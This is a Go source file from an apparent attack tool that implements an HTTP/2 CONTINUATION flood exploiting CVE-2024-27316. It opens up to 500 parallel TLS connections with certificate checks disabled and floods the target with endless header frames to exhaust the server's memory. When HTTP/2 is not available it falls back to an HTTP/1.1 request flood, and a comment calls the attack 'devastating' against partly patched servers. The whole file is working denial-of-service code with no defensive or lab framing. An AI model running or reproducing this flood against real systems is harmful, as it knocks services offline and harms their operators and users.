package attack

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"log"
	"net"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

// HTTP/2 CONTINUATION Flood (CVE-2024-27316)
// Sends HEADERS frame followed by infinite CONTINUATION frames
// Server keeps allocating memory waiting for END_HEADERS flag
// Devastating against servers that patched CVE-2023-44487 but missed this

func runContinuationFlood(cfg *AttackConfig) {
	atomic.StoreInt32(&stopFlag, 0)
	startTime := time.Now()
	deadline := startTime.Add(time.Duration(cfg.Duration) * time.Second)

	host, port, path, errParse := parseTargetForH2(cfg.Target)
	if errParse != nil {
		log.Printf("Invalid target: %v", errParse)
		return
	}

	connCount := cfg.Threads
	if connCount < 50 {
		connCount = 50
	}
	if connCount > 500 {
		connCount = 500
	}

	log.Printf("CONTINUATION Flood: %d parallel H2 connections, target %s:%s%s", connCount, host, port, path)

	var wg sync.WaitGroup
	for i := 0; i < connCount; i++ {
		wg.Add(1)
		go continuationWorker(i, host, port, path, deadline, &wg)
		time.Sleep(5 * time.Millisecond)
	}

	wg.Wait()
	metricsMu.Lock()
	metrics.Elapsed = time.Since(startTime).Seconds()
	metricsMu.Unlock()
}

func continuationWorker(id int, host, port, path string, deadline time.Time, wg *sync.WaitGroup) {
	defer wg.Done()
	defer func() {
		if r := recover(); r != nil {
			log.Printf("CONT worker %d recovered: %v", id, r)
		}
	}()

	for time.Now().Before(deadline) {
		if atomic.LoadInt32(&stopFlag) == 1 {
			return
		}

		err := burstContinuation(host, port, path, deadline)
		if err != nil {
			atomic.AddInt64(&metrics.Failed, 1)
			time.Sleep(100 * time.Millisecond)
		}
	}
}

func burstContinuation(host, port, path string, deadline time.Time) error {
	dial := createDialer("", 10*time.Second)
	rawConn, err := dial("tcp", host+":"+port)
	if err != nil {
		return fmt.Errorf("dial: %w", err)
	}

	if tcpConn, ok := rawConn.(*net.TCPConn); ok {
		tcpConn.SetNoDelay(true)
		tcpConn.SetKeepAlive(true)
	}

	tlsConn := tls.Client(rawConn, &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         host,
		NextProtos:         []string{"h2"},
	})
	tlsConn.SetDeadline(time.Now().Add(15 * time.Second))

	if err := tlsConn.Handshake(); err != nil {
		rawConn.Close()
		return fmt.Errorf("handshake: %w", err)
	}

	state := tlsConn.ConnectionState()
	if state.NegotiatedProtocol != "h2" {
		// Fallback: Server doesn't support HTTP/2, use HTTP/1.1 flood instead
		tlsConn.Close()
		return fallbackHTTP1FloodCont(rawConn, host, port, path, deadline)
	}

	defer tlsConn.Close()
	tlsConn.SetDeadline(time.Time{})

	if _, err := tlsConn.Write([]byte(http2.ClientPreface)); err != nil {
		return err
	}

	framer := http2.NewFramer(tlsConn, tlsConn)
	framer.SetMaxReadFrameSize(65536)

	if err := framer.WriteSettings(
		http2.Setting{ID: http2.SettingEnablePush, Val: 0},
		http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1000},
		http2.Setting{ID: http2.SettingInitialWindowSize, Val: 1048576},
	); err != nil {
		return err
	}

	go func() {
		defer func() { recover() }()
		for {
			tlsConn.SetReadDeadline(time.Now().Add(2 * time.Second))
			_, err := framer.ReadFrame()
			if err != nil {
				return
			}
		}
	}()

	authority := host
	if port != "443" {
		authority = host + ":" + port
	}

	streamID := uint32(1)
	connDeadline := time.Now().Add(60 * time.Second)

	for time.Now().Before(deadline) && time.Now().Before(connDeadline) {
		if atomic.LoadInt32(&stopFlag) == 1 {
			return nil
		}

		// Encode initial HEADERS frame (small, no END_HEADERS)
		var headerBuf bytes.Buffer
		encoder := hpack.NewEncoder(&headerBuf)
		encoder.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
		encoder.WriteField(hpack.HeaderField{Name: ":path", Value: path})
		encoder.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
		encoder.WriteField(hpack.HeaderField{Name: ":authority", Value: authority})

		// Send HEADERS WITHOUT END_HEADERS flag (server waits for CONTINUATION)
		err := framer.WriteHeaders(http2.HeadersFrameParam{
			StreamID:      streamID,
			BlockFragment: headerBuf.Bytes(),
			EndStream:     false,
			EndHeaders:    false, // <-- Key: tell server "more headers coming"
		})
		if err != nil {
			return fmt.Errorf("write headers: %w", err)
		}

		atomic.AddInt64(&metrics.TotalRequests, 1)

		// Now spam CONTINUATION frames (server keeps allocating memory)
		for i := 0; i < 200; i++ {
			var contBuf bytes.Buffer
			contEncoder := hpack.NewEncoder(&contBuf)
			// Pack random custom headers - server must HPACK-decode all of them
			for j := 0; j < 20; j++ {
				contEncoder.WriteField(hpack.HeaderField{
					Name:  fmt.Sprintf("x-custom-%d-%d", i, j),
					Value: fmt.Sprintf("%d-%d-%d", time.Now().UnixNano(), i, j),
				})
			}

			err := framer.WriteContinuation(streamID, false, contBuf.Bytes())
			if err != nil {
				atomic.AddInt64(&metrics.Failed, 1)
				return err
			}
		}

		// Send final CONTINUATION with END_HEADERS to close logically
		// then immediately RST_STREAM
		var endBuf bytes.Buffer
		endEncoder := hpack.NewEncoder(&endBuf)
		endEncoder.WriteField(hpack.HeaderField{Name: "x-end", Value: "1"})

		framer.WriteContinuation(streamID, true, endBuf.Bytes())
		framer.WriteRSTStream(streamID, http2.ErrCodeCancel)

		atomic.AddInt64(&metrics.Completed, 1)
		streamID += 2

		if streamID > 0x7FFFFFFE {
			return nil
		}
	}

	framer.WriteGoAway(streamID, http2.ErrCodeNo, []byte{})
	return nil
}

// Fallback to HTTP/1.1 flood when HTTP/2 not supported
func fallbackHTTP1FloodCont(rawConn net.Conn, host, port, path string, deadline time.Time) error {
	// Reopen connection since we closed TLS
	rawConn.Close()
	
	dial := createDialer("", 5*time.Second)
	conn, err := dial("tcp", host+":"+port)
	if err != nil {
		return fmt.Errorf("fallback dial: %w", err)
	}
	defer conn.Close()

	if tcpConn, ok := conn.(*net.TCPConn); ok {
		tcpConn.SetNoDelay(true)
		tcpConn.SetKeepAlive(true)
	}

	tlsConn := tls.Client(conn, &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         host,
	})
	tlsConn.SetDeadline(time.Now().Add(10 * time.Second))
	if err := tlsConn.Handshake(); err != nil {
		return fmt.Errorf("fallback handshake: %w", err)
	}
	tlsConn.SetDeadline(time.Time{})

	// Send rapid HTTP/1.1 requests
	for i := 0; i < 50 && time.Now().Before(deadline); i++ {
		if atomic.LoadInt32(&stopFlag) == 1 {
			return nil
		}

		req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n\r\n",
			path, host, randomUA())
		
		tlsConn.SetWriteDeadline(time.Now().Add(2 * time.Second))
		_, err := tlsConn.Write([]byte(req))
		if err != nil {
			return err
		}

		atomic.AddInt64(&metrics.TotalRequests, 1)
		atomic.AddInt64(&metrics.Completed, 1)
	}

	return nil
}

